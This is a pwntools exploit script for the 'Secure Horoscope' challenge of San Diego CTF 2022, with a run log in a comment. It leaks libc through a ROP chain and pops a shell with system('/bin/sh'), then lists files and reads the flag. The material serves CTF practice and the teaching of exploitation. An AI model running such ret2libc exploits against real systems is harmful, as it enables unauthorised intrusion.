from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './secureHoroscope'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "sechoroscope.sdc.tf"
  PORT = 1337
  s = remote(HOST, PORT)
else:
  s = process(BINARY)
libc = elf.libc

pop_rdi_ret = 0x400873  # pop rdi; ret; 
pop_rsi_ret = 0x400871  # pop rsi; pop r15; ret;

s.recvuntil("tell us how you feel\n")
buf  = p64(pop_rdi_ret)
buf += p64(elf.got.puts)
buf += p64(elf.plt.puts)
buf += p64(elf.sym.main)
s.sendline(buf)

s.recvuntil("horoscope\n")

buf  = "B"*120
buf += p64(pop_rsi_ret)
s.send(buf)

s.recvuntil("business days.\n")
puts_addr = u64(s.recvuntil("\n")[:-1]+"\x00\x00")
libc_base   = puts_addr - libc.sym.puts
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search('/bin/sh'))
print "puts_addr =", hex(puts_addr)
print "libc_base =", hex(libc_base)

s.recvuntil("tell us how you feel\n")
buf  = p64(pop_rdi_ret+1)
buf += p64(pop_rdi_ret)
buf += p64(binsh_addr)
buf += p64(system_addr)
s.sendline(buf)

buf  = "B"*120
buf += p64(pop_rsi_ret)
s.send(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/San_Diego_CTF_2022/Pwn_Secure_Horoscope$ python solve.py r
[*] '/home/mito/CTF/San_Diego_CTF_2022/Pwn_Secure_Horoscope/secureHoroscope'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to sechoroscope.sdc.tf on port 1337: Done
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
puts_addr = 0x7f902e2b2970
libc_base = 0x7f902e232000
[*] Switching to interactive mode
feeling like @? That's interesting.please put in your birthday and time in the format (month/day/year/time) and we will have your very own horoscope

BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB@
hm, I'll have to think about what this means. I'll get back to you in 5 business days.
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ ls -l
total 16
-rw-r--r-- 1 nobody nogroup    32 Apr 29 20:31 flag.txt
-rwxr-xr-x 1 nobody nogroup 11424 May  6 18:51 secureHoroscope
$ cat flag.txt
sdctf{Th0s3_d4rN_P15C3s_g0t_m3}
'''
